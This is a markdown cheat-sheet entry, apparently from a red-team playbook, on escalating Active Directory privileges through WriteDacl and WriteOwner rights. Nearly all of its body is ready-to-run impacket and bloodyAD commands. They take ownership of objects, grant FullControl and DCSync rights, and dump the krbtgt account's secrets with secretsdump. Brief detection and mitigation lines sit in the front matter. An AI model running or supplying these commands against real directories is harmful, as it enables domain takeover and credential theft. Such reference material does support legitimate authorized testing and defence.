---
title: WriteDacl / WriteOwner
category: AD / ACL abuse
order: 30
tags: [writedacl, writeowner, dacledit, owneredit, dcsync, bloodyad]
summary: >
  WriteDacl lets you grant yourself any right on the target (up to DCSync on the
  domain). WriteOwner lets you take ownership first, which implicitly grants
  WriteDacl — so the two chain together.
prerequisites:
  - WriteDacl or WriteOwner over the target object (from BloodHound)
  - LDAP reach to a DC ($dc_ip)
tools: [impacket (dacledit, owneredit), bloodyAD, PowerView]
detection:
  - 5136 modifications to nTSecurityDescriptor / owner; new ACEs granting DS-Replication-Get-Changes*
mitigation:
  - Remove the ACE; alert on DACL/owner changes to Tier-0 and the domain head
refs:
  - { label: "The Hacker Recipes — DACL", url: "https://www.thehacker.recipes/ad/movement/dacl" }
---

## WriteOwner → become owner → WriteDacl

```sh
# take ownership of the target
owneredit.py -action write -owner $user -target $target_user \
  -dc-ip $dc_ip $domain/$user:$password
# now grant yourself full control over it
dacledit.py -action write -rights FullControl -principal $user -target $target_user \
  -dc-ip $dc_ip $domain/$user:$password
```

## WriteDacl on the domain → grant DCSync

The nastiest use: WriteDacl on the **domain object** lets you grant your account
the replication rights and DCSync the krbtgt.

```sh
dacledit.py -action write -rights DCSync -principal $user -target-dn "$base_dn" \
  -dc-ip $dc_ip $domain/$user:$password
# then replicate (see DCSync)
secretsdump.py $domain/$user:$password@$dc_ip -just-dc-user $domain_nb/krbtgt
```

## bloodyAD equivalents

```sh
bloodyAD -u $user -p $password -d $domain --host $dc_ip set owner $target_user $user
bloodyAD -u $user -p $password -d $domain --host $dc_ip add genericAll $target_user $user
bloodyAD -u $user -p $password -d $domain --host $dc_ip add dcsync $user
```

> Always record the original owner/DACL and restore it — `dacledit`/`owneredit`
> support `-action read` to snapshot first.
